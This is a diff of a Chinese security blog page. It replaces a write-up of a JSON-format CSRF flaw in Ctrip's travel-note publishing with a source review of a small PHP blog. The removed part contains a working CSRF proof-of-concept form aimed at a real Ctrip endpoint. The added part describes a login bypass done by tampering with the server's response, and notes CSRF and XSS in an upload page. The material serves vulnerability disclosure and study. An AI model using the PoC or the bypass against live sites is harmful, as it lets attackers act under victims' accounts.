class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我们在浏览器打开这个<code>html</code>文件并且抓包~</p>
-<p><img src="http://static.zybuluo.com/1kbfree/hzrjgza3ogjghpkbdxwlxp4a/image_1cggv215618qv1c332bsaufrse2a.png" alt="image_1cggv215618qv1c332bsaufrse2a.png-113kB"></p>
-<blockquote>
-<p>看到这里的 <code>=</code> 号了吗，也就是说但我们在设置一个 <code>input</code> 属性的时候,会将<code>name</code>的值和<code>value</code>的值以一个等于号的形式传递，所以说上面我们构造好的<code>Csrf Poc</code>就是为了将这个<code>=</code>号放在数据里面，否则传递的<code>Json</code>会报错~</p>
+<h6 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h6><p>打开后发现只有一句代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">require</span>(<span class="string">'./page/login.html'</span>); <span class="comment">// 包含当前的page文件夹里的login.html文件</span></span><br></pre></td></tr></table></figure></p>
+<h6 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h6><p>打开后就是一些前端登陆的表单以及一些样式，然后他是将登陆的数据提交到<code>confirm.php</code>文件，如图：</p>
+<p><img src="http://static.zybuluo.com/1kbfree/5l8j1c0xqox3ml672s9vuypa/image_1chv4qovjliodscff9nr61smr82.png" alt="image_1chv4qovjliodscff9nr61smr82.png-149.6kB"></p>
+<p>表单之类的<code>html</code>代码不多讲，这里来分析一下js代码(这里有一个问授权访问漏洞，可以不输入密码直接登陆)：</p>
+<p><img src="http://static.zybuluo.com/1kbfree/5pqcsn5zw54secwj3s3ucf92/image_1chv5gf6v1fst1gv71kj61i161p538v.png" alt="image_1chv5gf6v1fst1gv71kj61i161p538v.png-172.4kB"></p>
+<p>然后我们来尝试登陆一下，查看<code>result</code>都会返回什么~</p>
+<p><img src="http://static.zybuluo.com/1kbfree/ooxrb0fsh5ipc0zij5iwcbp6/image_1chv5i6ucjs1vni1vonsji1pcn9c.png" alt="image_1chv5i6ucjs1vni1vonsji1pcn9c.png-109.6kB"></p>
+<p><em>表示登陆成功</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/sk4m0o2rczor7msf5pdt26yv/image_1chv5innl6vj1lo54241k2v1jdo9p.png" alt="image_1chv5innl6vj1lo54241k2v1jdo9p.png-110kB"></p>
+<p><em>表示登陆失败</em></p>
+<p><strong>我们身为白帽子，就是用来打破这些规矩的，输入错误密码的时候我们来抓包获取返回结果并且将<code>result</code>修改为<code>success</code>~</strong></p>
+<p><img src="http://static.zybuluo.com/1kbfree/xhumgcamh5j9uge6bj2ur0e4/php.png" alt="php.png-185.1kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/aif4kvy0lrvr90bdcv39pbpo/image_1chv5pvt5r761cm817v410slt023l.png" alt="image_1chv5pvt5r761cm817v410slt023l.png-95.7kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/76ue5oiav00tak7dvn1e077g/image_1chv5r0er6g8qe01tt81fdkhf842.png" alt="image_1chv5r0er6g8qe01tt81fdkhf842.png-90.1kB"><br><em>成功绕过</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/twgquzlmt9muvuo9lak67i8p/image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png" alt="image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png-92.7kB"></p>
+<p>接下来讲解一下<code>confirm.php</code>文件是如何接受数据的。</p>
+<h6 id="confirm-php"><a href="#confirm-php" class="headerlink" title="confirm.php"></a>confirm.php</h6><p><img src="http://static.zybuluo.com/1kbfree/u0ds3ms0ocjbpibqcvyk2oi9/image_1chv6gl8n15dpns31br5p11ttf5c.png" alt="image_1chv6gl8n15dpns31br5p11ttf5c.png-178.3kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/hb07nekxlo0afqp3jvfma62m/image_1chv6jdc0lak1c5h1bvl1if21es37p.png" alt="image_1chv6jdc0lak1c5h1bvl1if21es37p.png-88.8kB"></p>
+<p>上面的<code>$result</code>使用了<code>GetALL</code>函数，我们来看一下他的代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetAll</span><span class="params">($query)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>($tmp = mysql_fetch_array($query))&#123;</span><br><span class="line">        $result[] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> @$result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查询<code>$query</code>这个<code>sql</code>语句执行后的数据然后循环赋值到<code>$result</code>数组里。</p>
+<p><img src="http://static.zybuluo.com/1kbfree/2stc0xet22rj0o3ziicshqm1/image_1ci0vr2aq1udv1t4pun115fp1a6bp.png" alt="image_1ci0vr2aq1udv1t4pun115fp1a6bp.png-169.1kB"></p>
+<p><em>这里的不多将了，具体有注释了，下面没注释的就是一些登陆操作的（我也看不懂）</em></p>
+<h6 id="index-php-1"><a href="#index-php-1" class="headerlink" title="index.php"></a>index.php</h6><p>登陆页面分析完了，来分析一下首页页面。</p>
+<p><img src="http://static.zybuluo.com/1kbfree/mr0s9mk7c9vjn1oi37zc3xep/image_1ci100s7mi9g14vbasa16ft1aot26.png" alt="image_1ci100s7mi9g14vbasa16ft1aot26.png-115.3kB"></p>
+<p><strong>page文件夹里面的都是<code>html</code>文件，也就是展示页面效果的，就不多讲解了。</strong></p>
+<h6 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h6><blockquote>
+<p>这个文件是后台发布文章的</p>
 </blockquote>
-<h4 id="6-浏览器处打开这个Poc"><a href="#6-浏览器处打开这个Poc" class="headerlink" title="6. 浏览器处打开这个Poc"></a>6. 浏览器处打开这个Poc</h4><p><img src="http://static.zybuluo.com/1kbfree/jec1gasck1j6t5ns9dyyve3e/image_1cggvbjp914dp14bt1mec1j0r15vi2n.png" alt="image_1cggvbjp914dp14bt1mec1j0r15vi2n.png-32kB"></p>
-<p><img src="http://static.zybuluo.com/1kbfree/a3m0bhbmy7ximhww0y1rkas3/image_1cggvcoam1i5h3q4njf1sf41a3034.png" alt="image_1cggvcoam1i5h3q4njf1sf41a3034.png-46.6kB"></p>
-<p>我们确认一下是否可以发布</p>
-<p><img src="http://static.zybuluo.com/1kbfree/ykureziocu1mytqfp1b16wm9/image_1cggve0kq18quhsf1j4al8hfi4h.png" alt="image_1cggve0kq18quhsf1j4al8hfi4h.png-330.1kB"></p>
-<p><em>可以看到并没有发布，这其中肯定有猫腻，我们再继续分析一波</em></p>
-<h4 id="7-分析异常"><a href="#7-分析异常" class="headerlink" title="7. 分析异常"></a>7. 分析异常</h4><p><img src="http://static.zybuluo.com/1kbfree/57mwvrqtms0a7zrmawc0dflg/image_1cggvl77q79isqk1l4di5ts0u4u.png" alt="image_1cggvl77q79isqk1l4di5ts0u4u.png-129.2kB"></p>
-<h4 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="8. 异常处理"></a>8. 异常处理</h4><blockquote>
-<p>异常分析后修改的<code>Csrf Poc</code>如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&lt;/p&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1,"Title":"1111'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<h4 id="9-在浏览器处打开此POC"><a href="#9-在浏览器处打开此POC" class="headerlink" title="9. 在浏览器处打开此POC"></a>9. 在浏览器处打开此POC</h4><p><img src="http://static.zybuluo.com/1kbfree/knjs1crgvnkuduke1akrzii8/image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png" alt="image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png-28.3kB"></p>
-<p><img src="http://static.zybuluo.com/1kbfree/1nil8f18impk1tdhrbjynau8/image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png" alt="image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png-309.5kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/y77pa1n0wrgpus8ufy3ma3cf/image_1ci105k2r71l1k2d1na5sb11g7s2j.png" alt="image_1ci105k2r71l1k2d1na5sb11g7s2j.png-81.4kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/xm9ymwrgn5obbsfwyb7dsyl4/image_1ci10doif73q1vun1l5fq9a9i70.png" alt="image_1ci10doif73q1vun1l5fq9a9i70.png-180.8kB"></p>
+<p>这里是存在<code>Csrf</code>漏洞的，而且也没有过滤<code>Xss</code>漏洞，所以是存在<code>Xsrf</code>的，但是因为这里他完成了插入功能，但是没有完成展示插入的数据的功能，所以没办法继续讲解了，等作者把功能实现了我再来具体分析。</p>
 <blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p>
 </blockquote>
       
@@ -543,7 +558,7 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/06/21/携程某处存在Csrf漏洞发游记/">携程某处存在Json格式的Csrf漏洞发游记</a></p>
+  <p><span>本文标题:</span><a href="/2018/07/10/分析原生PHP博客-第二篇/">分析原生PHP博客-第二篇</a></p>
 
   
       <p><span>文章作者:</span><a href="/" title="访问 Iamfree 的博客">Iamfree</a></p>
@@ -554,10 +569,10 @@
   
   
 
-  <p><span>发布时间:</span>2018年06月21日 - 19:06</p>
-  <p><span>最后更新:</span>2018年06月22日 - 00:06</p>
-  <p><span>原始链接:</span><a href="/2018/06/21/携程某处存在Csrf漏洞发游记/" title="携程某处存在Json格式的Csrf漏洞发游记">127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年07月10日 - 10:07</p>
+  <p><span>最后更新:</span>2018年07月10日 - 10:07</p>
+  <p><span>原始链接:</span><a href="/2018/07/10/分析原生PHP博客-第二篇/" title="分析原生PHP博客-第二篇">127.0.0.1/2018/07/10/分析原生PHP博客-第二篇/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="127.0.0.1/2018/07/10/分析原生PHP博客-第二篇/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span>暂时请不要转载,感谢！！！</p>  
 </div>
@@ -630,9 +645,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞挖掘/" rel="tag"><i class="fa fa-tag"></i> 漏洞挖掘</a>
-          
-            <a href="/tags/Json-Csrf/" rel="tag"><i class="fa fa-tag"></i> Json Csrf</a>
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
           
         </div>
       
@@ -645,8 +658,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/16/腾讯某处SSRF漏洞/" rel="next" title="腾讯某处SSRF漏洞">
-                <i class="fa fa-chevron-left"></i> 腾讯某处SSRF漏洞
+              <a href="/2018/07/08/漏洞挖掘思路总结-续/" rel="next" title="漏洞挖掘思路总结[续]">
+                <i class="fa fa-chevron-left"></i> 漏洞挖掘思路总结[续]
               </a>
             
           </div>
@@ -654,10 +667,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/06/21/携程发游记处存在Csrf-存储Xss漏洞/" rel="prev" title="携程发游记处存在Csrf+存储Xss漏洞">
-                携程发游记处存在Csrf+存储Xss漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -879,7 +888,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-打开URL后，页面如图"><span class="nav-number">1.</span> <span class="nav-text">1. 打开URL后，页面如图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-点击上图的写游记"><span class="nav-number">2.</span> <span class="nav-text">2. 点击上图的写游记</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-点击发布"><span class="nav-number">3.</span> <span class="nav-text">3. 点击发布</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-选好后点击提交并且抓包"><span class="nav-number">4.</span> <span class="nav-text">4. 选好后点击提交并且抓包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-我们将其构造成-Csrf-Poc"><span class="nav-number">5.</span> <span class="nav-text">5. 我们将其构造成 Csrf Poc</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#疑问"><span class="nav-number">5.1.</span> <span class="nav-text">疑问</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#首先"><span class="nav-number">5.1.1.</span> <span class="nav-text">首先</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#案例"><span class="nav-number">5.1.2.</span> <span class="nav-text">案例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-浏览器处打开这个Poc"><span class="nav-number">6.</span> <span class="nav-text">6. 浏览器处打开这个Poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-分析异常"><span class="nav-number">7.</span> <span class="nav-text">7. 分析异常</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-异常处理"><span class="nav-number">8.</span> <span class="nav-text">8. 异常处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-在浏览器处打开此POC"><span class="nav-number">9.</span> <span class="nav-text">9. 在浏览器处打开此POC</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源代码讲解"><span class="nav-number">2.</span> <span class="nav-text">源代码讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#First、"><span class="nav-number">2.1.</span> <span class="nav-text">First、</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#index-php"><span class="nav-number">2.2.</span> <span class="nav-text">index.php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#首先看第三行和第四行："><span class="nav-number">2.2.1.</span> <span class="nav-text">首先看第三行和第四行：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#接着到了第七行："><span class="nav-number">2.2.2.</span> <span class="nav-text">接着到了第七行：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第8行："><span class="nav-number">2.2.3.</span> <span class="nav-text">第8行：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#打印-num："><span class="nav-number">2.2.4.</span> <span class="nav-text">打印$num：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#16-23行"><span class="nav-number">2.2.5.</span> <span class="nav-text">16-23行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#admin功能"><span class="nav-number">2.3.</span> <span class="nav-text">admin功能</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#登陆功能"><span class="nav-number">2.3.1.</span> <span class="nav-text">登陆功能</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#login-php"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">login.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#login-html"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">login.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#confirm-php"><span class="nav-number">2.3.1.3.</span> <span class="nav-text">confirm.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#index-php-1"><span class="nav-number">2.3.1.4.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#upload-php"><span class="nav-number">2.3.1.5.</span> <span class="nav-text">upload.php</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
